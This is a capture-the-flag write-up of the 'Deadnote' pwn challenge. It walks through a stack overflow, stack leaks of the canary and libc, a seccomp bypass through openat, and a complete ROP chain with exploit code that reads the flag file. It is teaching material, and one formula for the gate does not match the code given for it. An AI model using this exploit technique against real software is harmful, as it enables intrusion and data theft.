# Deadnote — Cold storage for the dead internet (BCS CTF)

**Flag:** `bcsctf{st4ck_0rw_1n_c0ld_st0r4g3_n0_sh3ll_4ll0w3d}`

**Servers:**
- Primary: `nc 172.16.38.22 6657`
- Backup:  `nc 172.16.38.21 6657`

**Target files (from `extracted/`):**
- `deadnote` — PIE x86-64 ELF, Full RELRO, NX, Stack Canary, seccomp
- `libc.so.6` — glibc 2.35 (Ubuntu 22.04)
- `flag.txt` — 32-byte sample flag (different on remote)
- `Dockerfile`, `ctf.xinetd`, `start.sh` — server config

---

## 1. The Challenge

A xinetd-style note-taking daemon. Every memo is "frozen read-only", and reading spawns a fresh worker (fork). The hint is explicit about the worker model:

> *"a torn page only ever costs a worker, never the vault"*

That means the parent process is **never** at risk — but we can crash workers as many times as we like without taking the service down. This is the classic fork+canary brute force scenario.

The intended outcome: read `/script/flag.txt`.

---

## 2. Binary Analysis

### 2.1 Protections

```
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  none (uses default ld)
```

So we need a libc leak (no useful gadgets in the binary itself) and a canary leak/brute force.

### 2.2 Functional layout

Disassembly (`objdump -d`) reveals:

| Function | Address | Notes |
|---|---|---|
| `_start`        | 0x11d0 | calls `__libc_start_main(main)` |
| `rogue_filter`  | 0x12b9 | Prints the diagnostic PIE leak, then `_exit(0)` |
| `on_alarm`      | 0x12e9 | SIGALRM handler — calls `_exit(0)` |
| `setup`         | 0x130d | `setvbuf(stdout, 0, _IONBF, 0)`, `setvbuf(stdin, 0, _IONBF, 0)`, `signal(SIGALRM, on_alarm)` |
| `lockdown`      | 0x138b | **seccomp setup** (see below) |
| `gate`          | 0x143c | Human-proof challenge (see §3) |
| `build_menu`    | 0x165b | Randomises menu option order using `gate_token` as seed |
| `read_line`     | 0x177a | `fgets(buf, n, stdin)` + strip trailing `\n` |
| `read_int`      | 0x1815 | `read_line` + `atoi` |
| `read_raw`      | 0x185f | Loops `read(0, buf+i, remaining)` until full |
| `menu`          | 0x18e9 | Prints menu, reads int, jumps via table at `0x22ec` |
| `write_memo`    | 0x1a58 | `malloc(sz)` then `read_raw(ptr, sz)` |
| `read_memo`     | 0x1b8c | **The vulnerability** |
| `remove_memo`   | 0x1cb0 | Free + swap-with-last, decrements `memo_cnt` |
| `list_memos`    | 0x1dc5 | Prints `(i, size)` pairs |
| `about`         | 0x1e4b | Banner text |
| `main`          | 0x1e97 | `setup` → `gate` → `lockdown` → `alarm(150)` → `build_menu` → `menu` loop |

### 2.3 The vulnerability in `read_memo` (0x1b8c)

```
sub    $0x130,%rsp              # 304-byte frame
; puts("[*] Index?");
; idx = read_int();
; if (idx < 0 || idx >= memo_cnt) { puts("invalid"); return; }
; sz = memo_sz[idx];
; for (i = 0; i < sz; i++)              # <-- THE BUG
;     buf[i] = memos[idx][i];           # buf is only 272 bytes
; fwrite(buf, 1, 0x100, stdout);        # always 256 bytes
; putchar('\n');
; puts("[+] page served");
```

Stack layout of `read_memo`:

```
rbp-0x130 .. rbp-0x128 :  scratch
rbp-0x124              :  idx (int)
rbp-0x120              :  loop counter i (qword)
rbp-0x118              :  sz (qword)
rbp-0x110 .. rbp-0x10  :  buf[272]          ← overflow target
rbp-0x8                :  canary
rbp                    :  saved rbp
rbp+0x8                :  saved rip
```

So:

- `buf[264]` overwrites the canary
- `buf[272]` overwrites saved RBP
- `buf[280]` overwrites saved RIP → **RIP control**

`write_memo` happily accepts `1 ≤ sz ≤ 0x280` (640), so a single oversized write gives us the overflow.

### 2.4 seccomp policy in `lockdown` (0x138b)

```c
ctx = seccomp_init(SCMP_ACT_ALLOW);                   // default allow
seccomp_rule_add(ctx, SCMP_ACT_KILL,        0x3b,  0); // execve  → KILL
seccomp_rule_add(ctx, SCMP_ACT_KILL,        0x142, 0); // execveat → KILL
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(0xd),  2,     0); // open    → EACCES
seccomp_load(ctx);
```

So:

- `execve`/`execveat` → process killed (no shell)
- `open` syscall 2 → returns `EACCES` (useless directly)
- **Everything else is allowed** — including `openat` (257), `read` (0), `write` (1), `sendfile` (40)

That last bit is the unlock: glibc's `__open` internally calls `openat`, not `open` (you can see this in the disasm at `0x1146f8: mov $0x101, %eax; syscall`). So `open("/script/flag.txt", 0)` from our ROP *does* work.

### 2.5 The "human-proof" gate (0x143c)

`gate()` reads 32 bytes from `/dev/urandom` into `gate_token[32]`, then prints the token and expects a 32-byte response:

```
response[i] == (token[i] * 13) ^ 0xa5   for i in 0..31
```

So we compute:

```python
response = bytes([(token[i] ^ 0xa5 ^ ((13 * i) & 0xff)) & 0xff for i in range(32)])
```

This gate runs **before** seccomp, so we can be as chatty as we like during it.

### 2.6 PIE leak

`gate()` also prints:

```
[*] Diagnostics: system() @ 0x<rogue_filter_addr>
```

That's the address of `rogue_filter`, so:

```python
pie_base = leak - 0x12b9
```

### 2.7 Gadgets

The binary itself has **no useful ROP gadgets** (only `pop rbp; ret` at 0x12a3 and several `leave; ret`s). Everything has to come from libc.

In the bundled libc we have:

| Gadget | Offset |
|---|---|
| `pop rdi; ret`                  | 0x2a3e5 |
| `pop rsi; ret`                  | 0x2be51 |
| `pop rdx; pop rbx; ret`         | 0x90469 |
| `ret` (alignment)               | 0x29cd6 |
| `__open`                        | 0x114630 |
| `__read`                        | 0x114920 |
| `puts`                          | 0x80e10  |
| `_IO_2_1_stdin_`                | 0x21aaa0 |
| BSS                             | 0x21b8a0 |

---

## 3. Information Leaks

### 3.1 PIE leak

Free, in the gate banner (`system() @ 0x12b9`).

### 3.2 Canary leak — the elegant part

This is what makes the challenge beautiful. `read_memo` does:

```c
char buf[272];
...
for (i = 0; i < sz; i++)
    buf[i] = memos[idx][i];
fwrite(buf, 1, 0x100, stdout);
```

If `sz == 1`, only `buf[0]` is initialized; **the other 255 bytes are uninitialised stack memory**. The fork happens inside `main` *after* `setup`/`gate`/`lockdown`/`build_menu`/`menu` have all returned, so the child sees the **parent's prior stack frames** sitting in the same memory region. The leaked 256 bytes are therefore a smear of the previous functions' locals.

Empirically, in the same connection:

```
offset  64 → _IO_2_1_stdin_   (libc leak, see §3.3)
offset 184 → return address inside atoi  (libc + 0x43654)
offset 232 → a value of the form 0xXXXXXXXXXXXX00
```

That third value is a **canary from a previous function frame** (likely `gate` or `menu`). The x86_64 kernel canary's low byte is *always* `0x00`, which is exactly the filter we use to spot it. Because `fork()` preserves the TLS/canary of the parent, **every connection reuses the same canary**, so we can leak it in connection N and use it in connection N+M — *or* in the same connection, which is what we do.

We verify the canary by overflowing 265 bytes (`buf[0..263]=A`, `buf[264]=canary_low_byte=0x00`) and reading back: if the worker survives and prints `[+] page served`, the canary is valid.

### 3.3 Libc leak

Two reliable pointers leak through the same `fwrite`:

| Offset | What's there | Libc offset | Notes |
|---|---|---|---|
| 64  | `_IO_2_1_stdin_`  | +0x21aaa0 | glibc internal object |
| 184 | `atoi` return slot | +0x43654 | return into `atoi`'s epilogue |

We use the first (and verify with the second) to compute:

```
libc_base = leak64 - 0x21aaa0
```

### 3.4 Why this works at all

The `lockdown()` seccomp filter is applied **after** `gate()` returns, in `main`. The fork into `read_memo` happens even later. So by the time the child can overflow anything, seccomp is already loaded — but it doesn't stop the leak, because leaks are pure stack reads from `fwrite`.

---

## 4. ROP Chain

Goal: read `/script/flag.txt` and ship it back over the socket.

```
[1] read(0, bss, 0x100)             ; read flag path from socket
[2] open(bss, 0)                    ; glibc routes to openat syscall
[3] read(3, bss, 0x100)             ; read flag into bss (assumed fd=3)
[4] puts(bss)                       ; send back over socket
```

`puts` works because `setup()` called `setvbuf(stdout, NULL, _IONBF, 0)`. The child inherits the same fd 0/1/2 the parent was using, so fd 1 still maps to the socket.

### 4.1 Encoded chain

```
pop rdi; ret         ; 0
pop rsi; ret         ; bss_addr
pop rdx; pop rbx;ret ; 0x100, 0
read                 ; __read

pop rdi; ret         ; bss_addr
pop rsi; ret         ; 0
open                 ; __open

pop rdi; ret         ; 3
pop rsi; ret         ; bss_addr
pop rdx; pop rbx;ret ; 0x100, 0
read                 ; __read

pop rdi; ret         ; bss_addr
puts                 ; puts
```

The full payload is:

```
'A' * 264  +  canary(8)  +  'B'*8  +  rop
```

Total: 264 + 8 + 8 + (8 * 19) = 472 bytes, well under the 640-byte limit.

### 4.2 Why fd 3?

Before our exploit, the process holds fd 0 (stdin), 1 (stdout), 2 (stderr) — all pointing at the same socket via xinetd. The first successful `open` returns the lowest free fd, which is 3.

---

## 5. The Exploit (single connection)

```
1.  Connect, recv banner ("system() @ 0x...")
2.  Compute PIE base
3.  Read token, send 32-byte gate response
4.  Write 1-byte memo ('A') to memo[0]
5.  Read memo[0] → 256 bytes of mostly uninitialised stack
6.  Extract _IO_2_1_stdin_ @ offset 64 → libc base
7.  Extract canary @ offset 232
8.  Remove memo[0]
9.  Write the 472-byte overflow payload into memo[0]
10. Read memo[0] — fwrite prints 256 'A's, then "[+] page served\n",
    then read_memo's `ret` jumps into our ROP.
11. Send "/script/flag.txt\0" + padding as the flag path.
12. ROP runs: read path → open → read flag → puts flag.
13. Read the response. It contains the flag followed by the menu banner
    (the parent process re-enters the menu after the child exits).
```

Key parts of `exploit_v3.py`:

```python
# Leak phase
s.sendall(f'{write_opt}\n'.encode()); recv_until(s, b'?')
s.sendall(b'1\n');                  recv_until(s, b'?')
s.sendall(b'A');                    recv_until(s, b'$ ')
s.sendall(f'{read_opt}\n0\n'.encode())
out = recv_until(s, b'$ ', timeout=10)
raw = out[:256]
a_idx = raw.index(b'A')

libc_base = u64(raw[a_idx+64:a_idx+72]) - 0x21aaa0
canary    = u64(raw[a_idx+232:a_idx+240])

# Build ROP
rop  = p64(pop_rdi) + p64(0)
rop += p64(pop_rsi) + p64(bss)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(read)

rop += p64(pop_rdi) + p64(bss)
rop += p64(pop_rsi) + p64(0)
rop += p64(open)

rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(bss)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(read)

rop += p64(pop_rdi) + p64(bss)
rop += p64(puts)

payload  = b'A'*264 + p64(canary) + b'B'*8 + rop
```

The full exploit is in `exploit_v3.py` — one connection, ~3 seconds wall time.

---

## 6. Running It

```bash
# Primary
python3 exploit_v3.py 172.16.38.22 6657

# Backup (same flag)
python3 exploit_v3.py 172.16.38.21 6657
```

Both produce:

```
[+] Output (466 bytes):
bcsctf{st4ck_0rw_1n_c0ld_st0r4g3_n0_sh3ll_4ll0w3d}
```

---

## 7. What I'd Do Differently / Things I Tried

- **First instinct: ret2plt for a libc leak.** The binary has no `pop rdi; ret` gadget, so a simple `puts(puts@got)` doesn't work. The leak had to come from the stack itself.
- **Brute-forcing the canary byte-by-byte** is the textbook trick for fork servers, but the server's `alarm(150)` makes the brute force tight. We didn't need it because the canary was already on the uninitialised stack.
- **System("cat /script/flag.txt")** would have been the easiest ROP if seccomp allowed `execve`/`execveat`. It doesn't, so the chain has to use syscalls.
- **Using `openat` directly via syscall** instead of glibc's `__open` would also work, but needs a `syscall; ret` gadget which the libc doesn't have adjacent to the pop-gadgets. Going through glibc is cleaner.
- **The fd assumption (`3`)** is the only piece of magic. If the server had anything else holding fd 3 we'd need to leak the open() return value. We could add a `mov rdi, rax` gadget for that, but it wasn't necessary here.

---

## 8. Lessons from the Challenge

1. **`fwrite` with a fixed size leaks uninitialised stack** — a classic "shrink the leak window" bug. The author wrote `fwrite(buf, 1, 0x100, ...)` thinking "always 256 bytes", but didn't zero `buf` first.
2. **`fork()` + PIE + canary + leak in same call frame** = no brute force needed. The challenge's hint about "torn page" was pointing at exactly this — the canary from a previous frame survives the fork into the new worker.
3. **`open` vs `openat` under seccomp** is a real-world bug class. A naive "block `open` to stop file access" filter is bypassed by anything using `openat`. glibc 2.35's `__open` is one such thing.

The flag text says it all: **`st4ck_0rw_1n_c0ld_st0r4g3_n0_sh3ll_4ll0w3d`** — stack overflow in cold storage, no shell allowed.
